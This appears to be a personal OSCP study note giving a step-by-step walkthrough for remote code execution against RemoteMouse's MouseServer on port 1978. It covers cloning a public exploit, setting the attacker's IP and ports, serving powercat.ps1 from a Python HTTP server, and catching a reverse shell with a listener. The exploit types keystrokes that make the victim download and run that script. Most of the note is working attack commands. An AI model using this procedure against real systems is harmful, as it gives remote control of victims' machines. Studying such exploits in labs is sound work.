RemoteMouse.exe 

Instantly get RCE, no prerequisite besides WifiMouse port being open
### What Will Happen

1. The script will talk to `MouseServer` on port 1978 and simulate typing `Win + R`.
2. It types a command forcing the target to hit `http://<YOUR_KALI_IP>/powercat.ps1` and save it to disk.
3. You will see a `200 OK` hit in your Python web server terminal.
4. The script executes `powercat.ps1 on the victim, giving you a full shell in your Netcat window.
### Step 1: Clone exploit repository

```
git clone https://github.com/mermehr/MouseServer-1.7.8.5-RCE.git && cd 'MouseServer-1.7.8.5-RCE'
```

### Step 2: Edit details of exploit

Gedit exploit.py :

```
lhost = "192.168.45.167"  # Your Attacker/Kali IP
lport = "4444"             # Your Netcat Listener Port
http_port = "80"          # Your local HTTP Server Port hosting powercat
```

```
target = socket(AF_INET, SOCK_STREAM)
port = 1978
```

Kali IP
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `${KaliIP}`;

dv.paragraph("```bash\n" + command + "\n```");
```
### Step 2: Host the Payload via Python HTTP Server

In KALI ATTACKER (Git Repository Folder)

```
python3 -m http.server 80
```
### Step 3: Start Your Netcat Listener

```
cd ~/Desktop/Tools/ && python3 penelope.py -p 4444
```
### Step 4: Fire the Exploit
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `python3 exploit.py ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
